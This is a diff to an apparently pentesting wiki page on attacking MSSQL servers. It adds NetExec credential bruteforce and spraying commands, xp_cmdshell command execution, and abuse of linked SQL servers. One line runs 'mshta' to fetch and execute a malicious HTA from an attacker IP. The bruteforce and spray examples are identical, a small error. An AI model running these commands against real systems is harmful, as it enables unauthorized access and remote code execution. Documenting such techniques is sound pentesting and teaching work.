@@ -72,6 +72,18 @@ If you **don't** **have credentials** you can try to guess them. You can use nma
 {% endhint %}
 
 {% tabs %}
+{% tab title="NetExec" %}
+Using [NetExec](https://github.com/Pennyw0rth/NetExec), we may bruteforce MSSQL credentials.
+
+```bash
+# Bruteforce
+nxc mssql <TARGET> -u <userfile> -p <passwordfile> --no-bruteforce
+
+# Password-Spray
+nxc mssql <TARGET> -u <userfile> -p <passwordfile> --no-bruteforce
+```
+{% endtab %}
+
 {% tab title="Hydra" %}
 Using Hydra, we may bruteforce MSSQL credentials.
 
@@ -125,6 +137,15 @@ netexec mssql <TARGET> -u <USER> -p <PASSWORD> --local-auth -q 'SELECT name FROM
 ### Remote Code Execution
 
 {% tabs %}
+{% tab title="NetExec" %}
+Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to execute OS commands from MSSQL
+
+```bash
+# Execute commands using xp_cmdshell
+netexec mssql <TARGET> -d <DOMAIN> -u <USER> -p <PASSWORD> -x "whoami"
+```
+{% endtab %}
+
 {% tab title="MSSqlPwner" %}
 [MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner) can be used to execute remote commands through various methods.
 
@@ -150,21 +171,11 @@ mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth inject-custom-asm S
 Using [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) from [Impacket](https://github.com/fortra/impacket), we may be able to execute code.
 
 ```sql
-$ mssqlclient.py -port 1433 DOMAIN/username:password@<target-ip>
-
+$ mssqlclient.py -port 1433 <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
 # Enable xp_cmdshell
 SQL (dbo@master)> enable_xp_cmdshell
 # Execute command
 SQL (dbo@master)> xp_cmdshell whoami
-```
-{% endtab %}
-
-{% tab title="NetExec" %}
-Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to execute OS commands from MSSQL
-
-```bash
-# Execute commands using xp_cmdshell
-netexec mssql <TARGET> -d <DOMAIN> -u <USER> -p <PASSWORD> -x "whoami"
 ```
 {% endtab %}
 {% endtabs %}
@@ -309,6 +320,57 @@ You probably will be able to **escalate to Administrator or NT AUTHORITY\SYSTEM*
 {% content-ref url="../../redteam/privilege-escalation/windows/abusing-tokens.md" %}
 [abusing-tokens.md](../../redteam/privilege-escalation/windows/abusing-tokens.md)
 {% endcontent-ref %}
+
+### Linked SQL Servers Abuse
+
+[Linked servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver16) are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
+
+{% tabs %}
+{% tab title="Ennumerate" %}
+From an UNIX-Like machine, we can enumerate Linked SQL Servers using [MssqlClient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) or [MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner).
+
+```bash
+# mssqlclient.py
+mssqlclient.py -port 1433 <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
+SQL (dbo@master)> enum_links
+
+# MSSqlPwner
+mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth get-link-server-list
+```
+
+{% hint style="info" %}
+We can also enumerate Linked Servers using the followins SQL query on a MSSQL instance:
+
+```sql
+EXEC sp_linkedservers;
+```
+{% endhint %}
+{% endtab %}
+
+{% tab title="Exploit" %}
+### Remote Execution
+
+From an UNIX-Like machine, we can execute code on a Linked SQL Servers using [MssqlClient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) or [MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner).&#x20;
+
+{% hint style="danger" %}
+The SQL login on the Linked SQL Server must be `sysadmin`
+{% endhint %}
+
+```bash
+# mssqlclient.py
+mssqlclient.py -port 1433 <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
+SQL (dbo@master)> use_link <LINKED_SRV_NAME>
+SQL >APPSRV01 (sa  dbo@master)> enable_xp_cmdshell
+SQL >APPSRV01 (sa  dbo@master)> xp_cmdshell whoami
+
+# MSSqlPwner
+## Execution using using stored procedures
+mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth exec whoami -link-name <LINKED_SRV_NAME>
+## Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
+mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth -link-name <LINKED_SRV_NAME> exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+```
+{% endtab %}
+{% endtabs %}
 
 ## Resources
 
